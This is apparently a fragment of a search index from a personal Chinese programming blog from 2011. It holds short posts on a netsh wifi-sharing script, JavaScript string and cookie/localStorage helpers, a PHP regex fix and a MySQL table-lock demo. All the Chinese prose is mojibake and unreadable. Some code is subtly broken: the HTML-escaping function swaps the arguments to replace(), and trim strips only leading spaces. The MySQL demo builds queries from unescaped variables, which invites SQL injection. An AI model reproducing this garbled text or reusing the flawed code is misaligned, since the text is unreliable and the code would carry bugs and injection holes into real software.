ä½¿ç”¨æ–‡ä»¶é”å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜.\n","date":"2011-10-20T00:00:00Z","permalink":"https://hitian.info/post/php-exec/","title":"phpæ‰§è¡ŒæœåŠ¡å™¨è„šæœ¬"},{"content":"å¹³æ—¶éƒ½ä½¿ç”¨è„šæœ¬æ¥å…±äº«wifiç»™æ‰‹æœº\nstart_wifi.bat\u0026gt;\nnetsh wlan set hostednetwork mode=allow ssid=TIANap key=21345678 netsh wlan start hostednetwork pause ä»Šå¤©æ›´æ–°é©±åŠ¨æ—¶å‘ç°äº†intelçš„my wifiä¾¿è¯•äº†ä¸‹, å¯ä»¥å®æ—¶æ˜¾ç¤ºéƒ½æœ‰å“ªäº›è®¾å¤‡ä½¿ç”¨äº†.ä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯å…¶ä»–è®¾å¤‡ä¸€ç›´ä¸èƒ½æ­£å¸¸è·å–åˆ°ipåœ°å€.\næ‰“å¼€my wifiåˆ›å»ºçš„æ— çº¿ç½‘ç»œè¿æ¥å±æ€§, å°è¯•ç€å°†é™¤äº†internet åè®®ç‰ˆæœ¬4 ä¹‹å¤–çš„å…¶ä»–é¡¹å…¨å–æ¶ˆäº†å°±å¥½äº†,ä¸çŸ¥é“ä»€ä¹ˆåŸå› å¯¼è‡´çš„.\n","date":"2011-09-14T00:00:00Z","permalink":"https://hitian.info/post/intel-my-wifi/","title":"intel my wifi æ— æ³•è·å–åˆ°ipçš„è§£å†³"},{"content":"/** * jså¸¸ç”¨æ“ä½œç±» */ var myTools = window.myTools = { // getElementById g: function(id){ return document.getElementById(id); }, // getElementsByTagName t: function(name){ return document.getElementsByTagName(name); }, writeHTML: function(id, content){ var target = this.g(id); if (target != null) { target.innerHTML = content; } }, //è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ï¼Œ ä¸­æ–‡ç®—ä¸¤ä¸ªå­— slen: function(str){ c = 0; for (var i = 0; i \u0026lt; str.length; i++) (str.charCodeAt(i) \u0026gt; 255) ? c += 2 : c++; return c; }, // è¿˜åŸhtml HtmlToStr: function(vStr){ vStr = vStr.replace(/\u0026amp;amp;/g, \u0026#34;\u0026amp;\u0026#34;); vStr = vStr.replace(/\u0026amp;quot;/g, \u0026#39;\u0026#34;\u0026#39;); vStr = vStr.replace(/\u0026amp;#039;/g, \u0026#34;\u0026#39;\u0026#34;); vStr = vStr.replace(/\u0026amp;lt;/g, \u0026#34;\u0026lt;\u0026#34;); vStr = vStr.replace(/\u0026amp;gt;/g, \u0026#34;\u0026gt;\u0026#34;); return vStr; }, // è½¬è¯‘html StrToHtml: function(str){ str = str.replace(\u0026#34;\u0026amp;\u0026#34;, /\u0026amp;amp;/g); str = str.replace(\u0026#39;\u0026#34;\u0026#39;, /\u0026amp;quot;/g); str = str.replace(\u0026#34;\u0026#39;\u0026#34;, /\u0026amp;#039;/g); str = str.replace(\u0026#34;\u0026lt;\u0026#34;, /\u0026amp;lt;/g); str = str.replace(\u0026#34;\u0026gt;\u0026#34;, /\u0026amp;gt;/g); return str; }, //æŒ‰é•¿åº¦æˆªå–ä¸­æ–‡å­—ç¬¦ä¸² subs: function(str, len){ var l = 0, s = \u0026#34;\u0026#34;; for (var i = 0; i \u0026lt; str.length; i++) { (str.charCodeAt(i) \u0026gt; 128) ? l += 2 : l++; s += str.charAt(i); if (l \u0026gt;= len) { return s; } } return s; }, //è·å–httprequestå¯¹è±¡ GetHttpRequest: function(){ if (window.XMLHttpRequest) { // Gecko return new XMLHttpRequest(); } else { if (window.ActiveXObject) { // IE return new ActiveXObject(\u0026#34;MsXml2.XmlHttp\u0026#34;); } } }, load_js_url: \u0026#39;\u0026#39;, //åŠ è½½js loadJs: function(_url){ var callback = arguments[1] || function(){ }; this.load_js_url = _url; var _script = $c(\u0026#34;SCRIPT\u0026#34;); _script.setAttribute(\u0026#34;type\u0026#34;, \u0026#34;text/javascript\u0026#34;); _script.setAttribute(\u0026#34;src\u0026#34;, _url); $t(\u0026#34;head\u0026#34;)[0].appendChild(_script); if (document.all) { _script.onreadystatechange = function(){ if (/onload|loaded|complete/.test(_script.readyState)) { callback \u0026amp;\u0026amp; callback(); } }; } else { _script.onload = function(){ callback(); }; } }, //å»ç©ºæ ¼ trim: function(str){ if (str != null \u0026amp;\u0026amp; str.length \u0026gt;= 1) { return str.replace(/(^\\s*)/g, \u0026#34;\u0026#34;); } } }; ","date":"2011-08-24T00:00:00Z","permalink":"https://hitian.info/post/js-tools/","title":"jså¸¸ç”¨æ“ä½œ"},{"content":"ä»Šå¤©è¦ä½¿ç”¨æ­£åˆ™æ¥æ‰¹é‡æ›¿æ¢ä¸€ä¸ªæŠ“å–é¡µé¢ä¸­çš„å›¾ç‰‡åœ°å€\n\u0026lt;?php $nrjl = preg_replace_callback(\u0026#39;#\u0026lt;img.*src=\u0026#34;([^\u0026#34;]+)\u0026#34;#isU\u0026#39;, \u0026#34;tianreplace\u0026#34;, $nrjl); function tianreplace($matches){ if(substr($matches[1],0,7)==\u0026#34;http://\u0026#34;){ return \u0026#39;\u0026lt;img src=\u0026#34;\u0026#39; . $matches[1] .\u0026#39;\u0026#34;\u0026#39;; }else{ global $this_domain; return \u0026#39;\u0026lt;img src=\u0026#34;http://\u0026#39;.$this_domain.\u0026#39;/\u0026#39; . $matches[1] .\u0026#39;\u0026#34;\u0026#39;; } } ?\u0026gt; ini_set(\u0026#39;pcre.backtrack_limit\u0026#39;, 10000000); å°±æ­£å¸¸äº†.\n","date":"2011-08-22T00:00:00Z","permalink":"https://hitian.info/post/php-regex-length-limit/","title":"phpæ³¨æ„æ­£åˆ™åŒ¹é…çš„é•¿åº¦é™åˆ¶"},{"content":"/** * tian */ //storage tools; var st = { sset : function(a, b) { storage.set(a, b); }, sget : function(a) { return storage.get(a); }, sdel : function(a) { storage.del(a); }, cset : function(a, b) { var c = [], _para = {}; for ( var d = 0, _len = arguments.length; d \u0026lt; _len; d++) { c[d] = arguments[d]; } ; _para.exps = typeof (c[2]) != \u0026#34;undefined\u0026#34; ? Math.ceil(c[2] / (3600 * 24)) : undefined; _para.name = c[0]; _para.val = c[1]; _para.path = c[3]; _para.domain = c[4]; _para.secure = c[5]; storage.cookieStore.set(_para); return false; }, cget : function(a) { return storage.cookieStore.get(a); }, cdel : function(a) { storage.cookieStore.del(a); } }; // var storage = { _g: function (id){return document.getElementById(id);}, _c: function (a){return document.createElement(a);}, _domain : \u0026#39;\u0026#39;, //è®¾ç½®cookieåŸŸå _store : null, _init : false, init : function() { if (window.localStorage) { this._store = this.localStore; } else if (navigator.userAgent.indexOf(\u0026#39;MSIE\u0026#39;) \u0026gt;= 0) { this._store = this.ieStore; } this._store.init(); this.cookieStore.init(); }, set : function(a, b) { this.checkInit(); this._store.set({ name : a, val : b }); }, get : function(a) { this.checkInit(); return this._store.get(a); }, del : function(a) { this.checkInit(); this._store.del(a); }, isInit : function() { this.checkInit(); return this._store._init; }, checkInit : function() { if (!this._init) this.init(); if (!this._store.isInit()) this._store.init(); }, localStore : { _init : true, init : function() { }, get : function(a) { return localStorage.getItem(a); }, set : function(a) { localStorage.setItem(a.name, a.val); }, del : function(a) { localStorage.removeItem(a); }, isInit : function() { return true; } }, ieStore : { exps : 180, _init : false, init : function() { if (!this.isInit() \u0026amp;\u0026amp; !storage._g(\u0026#34;_ieStore\u0026#34;)) { this.store = storage._c(\u0026#34;INPUT\u0026#34;), this.store.type = \u0026#34;hidden\u0026#34;, this.store.id = \u0026#34;_ieStore\u0026#34;, this.store .addBehavior(\u0026#34;#default#userData\u0026#34;); storage._g(\u0026#34;logo\u0026#34;).appendChild(this.store); //æ³¨æ„è¿™é‡Œçš„logo æ˜¯é¡µé¢é‡Œä¸€ä¸ªæ ‡ç­¾çš„id,ç”¨æ¥åˆ›å»ºuserdataçš„æ•°æ®è½½ä½“. this._init = true; } else if (storage._g(\u0026#34;_ieStore\u0026#34;)) { this.store = storage._g(\u0026#34;_ieStore\u0026#34;); this._init = true; } return this; }, get : function(a) { try { this.store.load(a); } catch (e) { return null; } return this.store.getAttribute(\u0026#34;__store__\u0026#34;) || null; }, set : function(a) { var b = a.name, _val = a.val, _exps = typeof (a.exps) != \u0026#34;undefined\u0026#34; ? a.exps : this.exps; var c = new Date(); c.setDate(c.getDate() + _exps); this.store.load(b); this.store.expires = c.toUTCString(); this.store.setAttribute(\u0026#34;__store__\u0026#34;, _val); this.store.save(b); }, del : function(a) { this.set({ name : a }, false, -1); }, isInit : function() { return this._init; } }, cookieStore : { _init : false, _exps : 180, _secure : \u0026#34;\u0026#34;, init : function() { if (!this.isInit()) { this._domain = storage._domain; this._init = true; } ; return this; }, get : function(a) { if (!this._init) this.init(); var b = document.cookie.split(\u0026#34;; \u0026#34;), a = a + \u0026#34;=\u0026#34;; for ( var c = 0, _len = b.length; c \u0026lt; _len; c++) { if (b[c].indexOf(a) != \u0026#34;-1\u0026#34;) { try { return decodeURIComponent(b[c].replace(a, \u0026#34;\u0026#34;)); } catch (e) { return unescape(b[c].replace(a, \u0026#34;\u0026#34;)); } } } return null; }, set : function(a) { if (!this._init) this.init(); var b = new Date(); var c = a.name, _val = a.val, _exps = typeof (a.exps) != \u0026#34;undefined\u0026#34; ? a.exps : this._exps, _domain = a.domain || this._domain, _path = a.path || \u0026#34;/\u0026#34;, _secure = a.secure || this._secure; b.setDate(b.getDate() + _exps); var d = c + \u0026#34;=\u0026#34; + escape(_val) + (_exps ? \u0026#34;;expires=\u0026#34; + b.toUTCString() : \u0026#34;\u0026#34;) + (_path ? \u0026#34;;path=\u0026#34; + _path : \u0026#34;\u0026#34;) + (_domain ? \u0026#34;;domain=\u0026#34; + _domain : \u0026#34;\u0026#34;) + (_secure ? \u0026#34;;secure=\u0026#34; : \u0026#34;\u0026#34;); document.cookie = d; }, del : function(a) { if (!this._init) this.init(); if (String.prototype.toLowerCase.apply(typeof (a)) == \u0026#34;string\u0026#34;) { _name = a; a = { name : _name, val : \u0026#34;\u0026#34; }; } a.exps = -1; a.secure = \u0026#34;\u0026#34;; this.set(a); }, isInit : function() { return this._init; } } }; ","date":"2011-08-21T00:00:00Z","permalink":"https://hitian.info/post/js-localstorage/","title":"jsæœ¬åœ°å­˜å‚¨å’Œcookieæ“ä½œ"},{"content":"ç”±äºä¸šåŠ¡éœ€è¦, ä¸€ä¸ªè¡¨ä¸å…è®¸ä¸¤ä¸ªåŠä»¥ä¸Šç”¨æˆ·åŒæ—¶æ“ä½œ.ç”±äºæ˜¯mysql4.1 äº‹åŠ¡ç­‰é«˜çº§ç‰¹æ€§å°±ä¸ç”¨æƒ³äº†, å­˜å‚¨å¼•æ“ç»Ÿä¸€ä½¿ç”¨çš„MyISAM.å…¶å®è½¬æ¢æˆInnoDB å°±å¯ä»¥ä½¿ç”¨è¡Œçº§é”äº†, ä½†æ˜¯ç”±äºæ˜¯çº¿ä¸Šæ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“, æ•°æ®é‡æ¯”è¾ƒå¤§,è½¬æ¢æ€•å‡ºç°æ„å¤–. è¦å®ç°çš„åŠŸèƒ½åˆæ˜¯åœ¨åå°ä½¿ç”¨. æ‰€ä»¥å°±ç›´æ¥ä½¿ç”¨è¡¨çº§é”å®Œå…¨å¯ä»¥äº†.åœ¨mysqlä¸­å¯¹è¡¨åŠ é”å’Œè§£é”å…¶å®æŒºç®€å•çš„\nLOCK TABLE table_name; UNLOCK TABLE; demo\n\u0026lt;?php $db = new Mysql(); $db-\u0026gt;open(); $db-\u0026gt;query(\u0026#34;lock table \u0026#34; . $table); $sql = \u0026#34;SELECT * FROM ${table} WHERE gid=\u0026#39;${gid}\u0026#39; AND sid IS NULL LIMIT 1\u0026#34;; $row = $db-\u0026gt;fetch($db-\u0026gt;query($sql)); $success = false; $re = array(); if($row){ $id = $row[\u0026#39;id\u0026#39;]; $update_data = array( \u0026#39;udate\u0026#39; =\u0026gt; date(\u0026#39;Y-m-d H:i:s\u0026#39;), \u0026#39;tuid\u0026#39; =\u0026gt; $uid, \u0026#39;operator\u0026#39; =\u0026gt; $_COOKIE[\u0026#39;admin_name\u0026#39;], \u0026#39;sid\u0026#39; =\u0026gt; $sid, ); $db-\u0026gt;update($this-\u0026gt;table, $update_data, \u0026#34;id=\u0026#39;$id\u0026#39;\u0026#34;); $result = $db-\u0026gt;getAffectedRows(); if($result \u0026gt; 0){ $success = true; $re = $row; }else{ $msg = \u0026#39;å‘ç”Ÿé”™è¯¯: ç‰©å“åº“å­˜ä¿®æ”¹å¤±è´¥!\u0026#39;; } }else{ $msg = \u0026#39;åº“å­˜ä¸è¶³\u0026#39;; } $db-\u0026gt;query(\u0026#34;unlock table\u0026#34;); $db-\u0026gt;close(); //return array($success, $msg, $re); ","date":"2011-07-12T00:00:00Z","permalink":"https://hitian.info/post/simple-mysql-table-level-locks/","title":"ç®€å•çš„mysqlè¡¨çº§é”"},{"content":"ä»ä»Šå¤©èµ·å°±åœ¨è¿™é‡Œå®‰å®¶äº†ã€‚ä»¥å‰ä¹Ÿåœ¨å…¶å®ƒåœ°æ–¹å¼€è¿‡åšå®¢ï¼Œä½†æ˜¯éƒ½æ²¡è¿‡å¤šä¹…å°±åŠé€”è€ŒåºŸäº†ï¼Œå¸Œæœ›è¿™æ¬¡å¯ä»¥åšæŒä¸‹å»ã€‚\ntian2011.07.08äºåœ°é“å››å·çº¿\n","date":"2011-07-07T00:00:00Z","permalink":"https://hitian.info/post/hello-world/","title":"Hello world!"}]